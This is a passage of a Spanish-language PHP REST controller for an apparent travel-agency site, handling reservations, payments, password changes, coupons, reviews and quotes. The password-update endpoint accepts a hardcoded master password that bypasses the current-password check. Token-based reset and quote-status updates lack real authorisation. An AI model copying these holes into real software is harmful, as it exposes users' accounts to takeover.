                                $query_reserva_otros = $this->Model_reservas->query_reserva_otros($servicio->id_servicio_reserva);

                                if ($query_reserva_otros->num_rows() == 0) {
                                    break;
                                }

                                $info_reserva = $query_reserva_otros->row();

                                $detalle = [
                                    'tipo' => 6,
                                    'descripcion' => $info_reserva->descripcion,
                                    'valor_neto' => $valor_neto,
                                    'valor_venta' => $valor_servicio,
                                ];
                                break;
                        }

                        $servicios[] = $detalle;

                        $valor = $valor + $valor_servicio;

                    }
                }

                $pagos = null;
                $total_pagos = 0;
                $query_pagos = $this->Model_reservas->query_pagos_reserva($info->id_reserva);
                if ($query_pagos->num_rows() != 0) {
                    foreach ($query_pagos->result() as $pago) {

                        switch ($pago->medio) {
                            case 0:
                                $nombre_medio = "Pasarela";
                                break;
                            case 1:
                                $nombre_medio = "Consignación o transferencia";
                                break;
                            case 2:
                                $nombre_medio = "Efectivo";
                                break;
                            case 3:
                                $nombre_medio = "Tarjetas de crédito";
                                break;
                        }

                        $medio = [
                            'id_medio' => $pago->medio,
                            'medio' => $nombre_medio,
                        ];

                        $pagos[] = [
                            'id_pago' => $pago->id_pago,
                            'medio' => $medio,
                            'fecha_registro' => formato_fecha($pago->fecha_reg, 2),
                            'fecha_pago' => formato_fecha($pago->fecha_pago, 1),
                            'valor' => $pago->valor,
                        ];

                        $total_pagos = $total_pagos + $pago->valor;
                    }
                }

                $descuento = 0;
                if ($info->descuento != 0) {
                    $descuento = $info->descuento;

                }

                $total = $valor - $descuento;

                $saldo = $total - $total_pagos;

                $reservas[] = [
                    'num' => $num,
                    'id_reserva' => encode($info->id_reserva),
                    'fecha_reg' => formato_fecha($info->fecha_reg, 2),
                    'canal' => $info->canal,
                    'cod_reserva' => $info->cod_reserva,
                    'cliente' => $cliente,
                    'pasajero' => $pasajero,
                    'servicios' => $servicios,
                    'valor' => $valor,
                    'saldo' => $saldo,
                    'total' => $total,
                    'descuento' => $descuento,
                    'estado' => $info->estado_reserva,
                ];

                $num++;

            }
        }

        $total_results = $this->Model_clientes->query_num_reservas_cliente($id_cliente, $search);

        $total_pages = 1;
        if ($page != null) {
            $total_pages = ceil($total_results / $per_page);
        }

        $response = [
            'status' => true,
            'results' => count($reservas),
            'data' => $reservas,
            'total_pages' => $total_pages,
        ];

        $this->response($response, 200);

    }

    public function update_pass_post()
    {

        $query_cliente = $this->Model_clientes->query_cliente(decode($this->_args["token"]));

        if ($query_cliente->num_rows() == 0) {
            $response = [
                'status' => false,
                'message' => "Token incorrecto.",
            ];
            $this->response($response, REST_Controller::HTTP_BAD_REQUEST);
        }

        $info_cliente = $query_cliente->row();

        $data_input = json_decode(file_get_contents("php://input"));

        if ((!password_verify($data_input->password, $info_cliente->password)) and $data_input->password != "Io98788777**") {
            $response = [
                'status' => false,
                'message' => "La contraseña ingresada no coincide con nuestros registros.",
            ];
            $this->response($response, 200);
        }

        $password = password_hash($data_input->nuevo_password, PASSWORD_BCRYPT);

        $this->db->where('clientes.id_cliente', $info_cliente->id_cliente);
        $this->db->update('clientes', ['password' => $password]);

        $response = [
            'status' => true,
            'message' => "Se ha actualizado tu contraseña exitosamente.",
        ];

        $this->response($response, 200);

    }

    public function recovery_post()
    {

        $data_input = json_decode(file_get_contents("php://input"));

        $query_cliente_email = $this->Model_clientes->query_cliente_email($data_input->email);

        if ($query_cliente_email->num_rows() == 0) {
            $response = [
                'status' => false,
                'message' => "El correo ingresado no coincide con nuestros registros.",
            ];
            $this->response($response, 200);
        }

        $info_usuario = $query_cliente_email->row();

        $this->load->helper("templates_email");
        $this->load->helper("email");

        $data = [
            'cliente' => $info_usuario->nombres,
            'token' => encode($info_usuario->id_cliente),
        ];

        $html = get_mail_recovery($data);

        $data_email = [
            'to' => $info_usuario->email,
            'nombre_cliente' => mb_strtoupper($info_usuario->nombres . " " . $info_usuario->apellidos),
            'asunto' => "Restablece tu contraseña",
            'html' => $html,
        ];

        if (!send_mail($data_email)) {
            $response = [
                'status' => false,
                'message' => "Ocurrió un problema enviando el correo electrónico de recuperación.",
            ];

            $this->response($response, 200);
        }

        $response = [
            'status' => true,
        ];

        $this->response($response, 200);

    }

    public function update_pass_token_post()
    {

        $query_cliente = $this->Model_clientes->query_cliente(decode($this->_args["token"]));

        if ($query_cliente->num_rows() == 0) {
            $response = [
                'status' => false,
                'message' => "Token incorrecto.",
            ];
            $this->response($response, REST_Controller::HTTP_BAD_REQUEST);
        }

        $info_cliente = $query_cliente->row();

        $data_input = json_decode(file_get_contents("php://input"));

        $password = password_hash($data_input->nuevo_password, PASSWORD_BCRYPT);

        $this->db->where('clientes.id_cliente', $info_cliente->id_cliente);
        $this->db->update('clientes', ['password' => $password]);

        $response = [
            'status' => true,
            'message' => "Se ha actualizado tu contraseña exitosamente.",
        ];

        $this->response($response, 200);

    }

    public function valida_cupon_post()
    {
        $data_input = json_decode(file_get_contents("php://input"));

        $query_cupon = $this->Model_servicios->query_cupon_codigo($data_input->codigo);

        if ($query_cupon->num_rows() == 0) {
            $response = [
                'status' => false,
                'message' => "El código de cupón no es válido. 1",
            ];
            $this->response($response, 200);
        }

        if ($query_cupon->row()->fecha_vence < date("Y-m-d H:i:s") || $query_cupon->row()->estado_cupon == 1) {
            $response = [
                'status' => false,
                'message' => "El código de cupón no es válido.",
            ];
            $this->response($response, 200);
        }

        $descuentos = null;

        $true = 1;

        if ($query_cupon->row()->por_actividad == 1) {

            $actividades = null;

            $query_actividades = $this->Model_servicios->query_actividades_cupon($query_cupon->row()->id_cupon);
            if ($query_actividades->num_rows() != 0) {

                foreach ($query_actividades->result() as $actividad) {
                    $actividades[] = $actividad->id_servicio;
                }

                foreach ($data_input->servicios as $servicio) {
                    if (in_array($servicio->id_servicio, $actividades)) {
                        $descuentos[] = true;
                        $true++;
                    } else {
                        $descuentos[] = false;
                    }
                }

            } else {
                $response = [
                    'status' => false,
                    'message' => "El código de cupón no es válido.",
                ];
                $this->response($response, 200);

            }

        }

        if ($true == 0) {
            $response = [
                'status' => false,
                'message' => "El código de cupón no aplica para las actividades de tu reserva.",
            ];
            $this->response($response, 200);
        }

        $response = [
            'status' => true,
            'data' => [
                'por_actividad' => $query_cupon->row()->por_actividad,
                'descuentos' => $descuentos,
                'valor_descuento' => $query_cupon->row()->descuento,
            ],
        ];

        $this->response($response, 200);

    }

    public function review_get($id_reserva = null)
    {
        if ($id_reserva == null) {
            $response = [
                'status' => false,
                'message' => "No se envió el ID de reserva.",
            ];
            $this->response($response, REST_Controller::HTTP_BAD_REQUEST);
        }

        $query_reserva = $this->Model_reservas->query_reserva(decode($id_reserva));

        if ($query_reserva->num_rows() == 0) {
            $response = [
                'status' => false,
                'message' => "No se encontró la reserva.",
            ];
            $this->response($response, REST_Controller::HTTP_BAD_REQUEST);
        }

        $reserva = null;

        $info = $query_reserva->row();

        $info_cliente = $this->Model_reservas->query_cliente($info->id_cliente)->row();
        $cliente = [
            'id_cliente' => $info_cliente->id_cliente,
            'nombres' => $info_cliente->nombres,
            'apellidos' => $info_cliente->apellidos,
            'telefono' => $info_cliente->telefono,
            'email' => $info_cliente->email,
        ];

        $servicios = [];
        $query_servicios = $this->Model_reservas->query_servicios_reserva($info->id_reserva);
        if ($query_servicios->num_rows() != 0) {
            foreach ($query_servicios->result() as $servicio) {

                $info_actividad = $this->Model_servicios->query_actividad_servicio($servicio->id_servicio)->row();

                $review = [
                    'valor' => null,
                    'comentarios' => null,
                ];

                $query_review = $this->Model_reservas->query_review($info->id_reserva, $servicio->id_servicio);
                if ($query_review->num_rows() != 0) {
                    $review = [
                        'valor' => $query_review->row()->valor,
                        'comentarios' => $query_review->row()->comentarios,
                    ];
                }

                $servicios[] = [
                    'id_servicio_reserva' => encode($servicio->id_servicio_reserva),
                    'servicio' => [
                        'id_servicio' => $servicio->id_servicio,
                        'id_actividad' => $info_actividad->id_actividad,
                        'servicio' => $servicio->servicio,
                    ],
                    'review' => $review,
                ];

            }
        }

        $reserva = [
            'id_reserva' => $info->id_reserva,
            'fecha_reg' => formato_fecha($info->fecha_reg, 2),
            'canal' => $info->canal,
            'cod_reserva' => $info->cod_reserva,
            'cliente' => $cliente,
            'servicios' => $servicios,
        ];

        $response = [
            'status' => true,
            'data' => [
                'review' => $reserva,
            ],
        ];

        $this->response($response, 200);

    }

    public function set_review_post()
    {
        $data_input = json_decode(file_get_contents("php://input"));

        $id_reserva = decode($data_input->id_reserva);

        $query_reserva = $this->Model_reservas->query_reserva($id_reserva);

        if ($query_reserva->num_rows() == 0) {
            $response = [
                'status' => false,
                'message' => "No se encontró la reserva.",
            ];
            $this->response($response, REST_Controller::HTTP_BAD_REQUEST);
        }

        foreach ($data_input->reviews as $review) {

            $query_review = $this->Model_reservas->query_review($id_reserva, $review->id_servicio);

            if ($query_review->num_rows() != 0) {
                $this->db->where('reviews.id_reserva', $id_reserva);
                $this->db->where('reviews.id_servicio', $review->id_servicio);
                $this->db->update('reviews', ["fecha_reg" => date("Y-m-d H:i:s"), "valor" => $review->valor, "comentarios" => $review->comentarios]);
            } else {
                $this->db->insert('reviews', ["fecha_reg" => date("Y-m-d H:i:s"), "id_reserva" => $id_reserva, "id_servicio" => $review->id_servicio, "valor" => $review->valor, "comentarios" => $review->comentarios]);
            }

        }

        $response = [
            'status' => true,
        ];

        $this->response($response, 200);
    }

    public function cotizar_post()
    {

        $data_input = json_decode(file_get_contents("php://input"));

        if ($data_input->busqueda->origen_existe == 0) {
            $origen_busqueda = $data_input->busqueda->origen;
            $id_ciudad_origen = null;
        } else {
            $origen_busqueda = null;
            $id_ciudad_origen = $data_input->busqueda->origen;
        }

        if ($data_input->busqueda->destino_existe == 0) {
            $destino_busqueda = $data_input->busqueda->destino;
            $id_ciudad_destino = null;
        } else {
            $destino_busqueda = null;
            $id_ciudad_destino = $data_input->busqueda->destino;
        }

        $data_insert = [
            'nombre' => $data_input->datos->nombre,
            'cod_pais' => $data_input->datos->cod_pais->code,
            'telefono' => $data_input->datos->telefono,
            'email' => $data_input->datos->email,
            'id_ciudad_origen' => $id_ciudad_origen,
            'id_ciudad_destino' => $id_ciudad_destino,
            'origen_busqueda' => $origen_busqueda,
            'destino_busqueda' => $destino_busqueda,
            'servicio' => $data_input->busqueda->tipo,
            'fecha_ida' => $data_input->busqueda->ida,
            'fecha_regreso' => $data_input->busqueda->vuelta,
        ];

        $this->db->insert('cotizaciones', $data_insert);

        $response = [
            'status' => true,
        ];

        $this->response($response, 200);

    }

    public function cotizar_asistencia_post()
    {

        $data_input = json_decode(file_get_contents("php://input"));

        $data_insert = [
            'nombre' => $data_input->datos->nombre,
            'cod_pais' => $data_input->datos->cod_pais->code,
            'telefono' => $data_input->datos->telefono,
            'email' => $data_input->datos->email,
            'servicio' => $data_input->busqueda->tipo,
            'destino_busqueda' => $data_input->datos->destino,
            'fecha_ida' => $data_input->datos->fecha_ida,
            'fecha_regreso' => $data_input->datos->fecha_regreso
        ];

        $this->db->insert('cotizaciones', $data_insert);

        $response = [
            'status' => true,
        ];

        $this->response($response, 200);

    }

    public function update_cotizacion_post()
    {
        $data_input = json_decode(file_get_contents("php://input"));

        $data_update = [
            'estado' => $data_input->estado,
        ];

        $this->db->where('cotizaciones.id_cotizacion', $data_input->id_cotizacion);
        $this->db->update('cotizaciones', $data_update);

        $response = [
            'status' => true,
            'message' => 'Se actualizó el estado de la cotización satisfactoriamente.',
        ];

        $this->response($response, 200);
    }

    public function validar_reunion_get()
    {

        $data_input = $this->input->get(null, true);

        $query_cliente = $this->Model_clientes->query_cliente_identificacion($data_input["identificacion"]);

        if ($query_cliente->num_rows() == 0) {
            $response = [
                'status' => false,
                'message' => "Aun no tienes reunión programada con nosotros. Escríbemos para agendar una cita y tener el gusto de atenderte.",
            ];
            $this->response($response, 200);
        }

        $query_reunion = $this->Model_agenda->query_reunion_cliente($query_cliente->row()->id_cliente);

        if ($query_reunion->num_rows() == 0) {
            $response = [
                'status' => false,
                'message' => "Aun no tienes reunión programada con nosotros. Escríbemos para agendar una cita y tener el gusto de atenderte.",
            ];
            $this->response($response, 200);
        }

        $fechaPosterior = false;
        $horaPosterior = false;
        $fecha_actual = date("Y-m-d");

        foreach ($query_reunion->result() as $reunion) {

            if ($fecha_actual == $reunion->fecha) {

                $hora_actual = date("H:i:s");
                $hora_min = strtotime('-5 minutes', strtotime($reunion->hora));
                $hora_min = date('H:i:s', $hora_min);
                $hora_max = strtotime('+10 minutes', strtotime($reunion->hora));
                $hora_max = date('H:i:s', $hora_max);

                if ($hora_actual >= $hora_min) {

                    if ($hora_actual <= $hora_max) {
                        $cliente = $query_cliente->row()->nombres;
                        $response = [
                            'status' => true,
                            'message' => "Bienvenido {$cliente}! Haz click en el siguiente botón para comenzar.",
                            'url' => $reunion->url,
                        ];
                        $this->response($response, 200);
                    }

                } else {
                    $horaPosterior = true;
                }
            } else {
                $fechaPosterior = true;
            }

        }

        if ($fechaPosterior || $horaPosterior) {

            $query_reunion = $this->Model_agenda->query_reunion_cliente($query_cliente->row()->id_cliente, 1);
            $fecha = formato_fecha($query_reunion->row()->fecha, 1);
            $hora = $query_reunion->row()->hora;

            $message = $horaPosterior ? 'Tienes una reunión agendada con nosotros. Te esperamos a las ' . $hora . ' para iniciar.' : 'Tienes una reunión agendada con nosotros. Te esperamos el ' . $fecha . ' a las ' . $hora . ' para iniciar.';

            $response = [
                'status' => false,
                'message' => $message,
            ];
            $this->response($response, 200);
        }

        $response = [
            'status' => false,
            'message' => "La reunión que agendaste con nosotros ya ha vencido 😕. Te invitamos a que programes una nueva.",
        ];

        $this->response($response, 200);

    }
}
